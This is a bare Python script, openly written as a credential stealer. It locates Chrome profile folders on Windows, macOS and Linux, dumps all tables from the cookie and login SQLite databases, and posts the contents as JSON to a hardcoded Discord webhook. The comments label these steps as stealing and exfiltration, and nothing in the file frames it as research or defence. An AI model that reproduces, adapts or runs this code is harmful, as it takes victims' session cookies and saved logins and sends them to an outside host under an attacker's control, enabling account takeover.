import os
import platform
import requests
import subprocess
import json

# Discord webhook URL
discord_webhook = "https://discord.com/api/webhooks/1388760353772535930/pnZFz1Prz8k7n0K861P_87Jlc__lNawsrYe1YpFCXItj-pwbOLcHU9ggPAgNKxe4Zzle"

# Function to steal browser data
def steal_browser_data():
    data = {}
    system_platform = platform.system()

    if system_platform == "Windows":
        # Stealing cookies and passwords from Chrome
        chrome_profile_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default")
        data['chrome_cookies'] = read_sqlite_database(os.path.join(chrome_profile_path, 'Cookies'))
        data['chrome_logins'] = read_sqlite_database(os.path.join(chrome_profile_path, 'Logins'))

    elif system_platform == "Darwin":  # macOS
        # Stealing cookies and passwords from Chrome
        chrome_profile_path = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default")
        data['chrome_cookies'] = read_sqlite_database(os.path.join(chrome_profile_path, 'Cookies'))
        data['chrome_logins'] = read_sqlite_database(os.path.join(chrome_profile_path, 'Logins'))

    elif system_platform == "Linux":
        # Stealing cookies and passwords from Chrome
        chrome_profile_path = os.path.expanduser("~/.config/google-chrome/Default")
        data['chrome_cookies'] = read_sqlite_database(os.path.join(chrome_profile_path, 'Cookies'))
        data['chrome_logins'] = read_sqlite_database(os.path.join(chrome_profile_path, 'Logins'))

    return data

# Function to read SQLite database
def read_sqlite_database(db_path):
    import sqlite3
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM sqlite_master WHERE type='table';")
    tables = cursor.fetchall()
    result = {}
    for table in tables:
        table_name = table[1]
        cursor.execute(f"SELECT * FROM {table_name}")
        result[table_name] = cursor.fetchall()
    conn.close()
    return result

# Function to exfiltrate data to Discord
def exfiltrate_data_to_discord(data):
    payload = {
        "content": json.dumps(data, indent=2)
    }
    response = requests.post(discord_webhook, json=payload)
    print("Data exfiltrated:", response.status_code, response.text)

# Main function
if __name__ == "__main__":
    stolen_data = steal_browser_data()
    exfiltrate_data_to_discord(stolen_data)
